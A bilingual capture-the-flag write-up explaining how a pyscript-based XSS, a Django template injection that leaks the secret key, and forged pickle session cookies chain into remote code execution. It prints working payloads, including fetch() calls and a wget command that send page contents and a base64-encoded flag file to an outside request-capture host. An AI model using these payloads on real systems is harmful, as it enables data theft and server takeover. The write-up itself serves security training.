# Writeup

## English

- The pyscript functionality allows us to get a reflected XSS with the following payload that we report to the admin:
  ```python
  import base64
  from js import fetch
  fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes('test', encoding='UTF-8')).decode())
  ```
- From this XSS, it is possible to execute javascript on the administrator's browser.
- It is not possible to retrieve the administrator's cookies as they are ``HTTP only``.
- It is possible to retrieve the content of the HTML page with :
  ```python
  import base64
  from js import fetch, document
  fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes(document.getElementsByTagName('body')[0].innerText, encoding='UTF-8')).decode())
  ```
- Nothing interesting is found because the administrator's report functionality allows him to view the python code through an iframe
- To retrieve the HTML content of the page that contains the iframe :
  ```python
  import base64
  from js import fetch, parent
  fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes(parent.document.getElementsByTagName('body')[0].innerText, encoding='UTF-8')).decode())
  ```
- We then find our username and the message we sent in the report
- It is possible to exploit a DTL SSTI vulnerability through the message sent: ``{{ "test" }}``
- It is then possible to recover the secret key used by Django with the payload:
  ```
  {{ messages.storages.0.signer.key }}
  ```
- From this secret key, it is possible to forge Django session cookies. In addition, here the Django application uses Pickle as a 
  means of serializing the data contained in the session cookie. It is possible to obtain an RCE (https://docs.djangoproject.com/en/4.1/topics/http/sessions/#using-cookie-based-sessions)
- The ``wu.py`` script is used to obtain the RCE. The script is mainly taken from the Django source code which manages the production of cookies.
- For example, you can use this command to exfiltrate the flag: ``wget "https://endpoint.free.beeceptor.com?a=`cat flag.txt | base64 -w 0`"``
- Get the flag ;)

## Français

- La fonctionnalité pyscript nous permet de récupérer une XSS réfléchi avec le payload suivant qu'on report à l'admin :
  ```python
    import base64
    from js import fetch
    fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes('test', encoding='UTF-8')).decode())
  ```
- A partir de cette XSS, il est possible d'exécuter du javascript sur le navigateur de l'administrateur.
- Il n'est pas possible de récupérer les cookies de l'administrateur car ils sont en ``HTTP only``
- Il est par contre possible de récupérer le contenu de la page HTML avec :
  ```python
    import base64
    from js import fetch, document
    fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes(document.getElementsByTagName('body')[0].innerText, encoding='UTF-8')).decode())
  ```
- On ne trouve rien d'intéressant car la fonctionnalité de report de l'administrateur lui permet de consulter le code python à travers une iframe
- Pour récupérer le contenu HTML de la page qui contient l'iframe :
  ```python
    import base64
    from js import fetch, parent
    fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes(parent.document.getElementsByTagName('body')[0].innerText, encoding='UTF-8')).decode())
  ```
- On trouve alors notre nom d'utilisateur et le message qu'on a envoyé dans le report
- Il est possible d'exploiter une faille de type DTL SSTI à travers le message envoyé : ``{{ "test" }}``
- Il est ensuite possible de récupérer la secret key utilisé par Django avec le payload :
  ```
  {{ messages.storages.0.signer.key }}
  ```
- A partir de cette secret key, il est possible de forger des cookies de session Django. De plus, ici l'application Django utilise Pickle comme 
  moyen de serialization des données contenu dans le cookie de session. Il est possible d'obtenir une RCE (https://docs.djangoproject.com/en/4.1/topics/http/sessions/#using-cookie-based-sessions)
- Le script ``wu.py`` permet d'obtenir la RCE. Le script est principalement issu du code source de Django qui gère la fabrication des cookies.
- On peut par exemple utiliser cette commande pour exfiltrer le flag : ``wget "https://endpoint.free.beeceptor.com?a=`cat flag.txt | base64 -w 0`"``
- Get the flag ;)
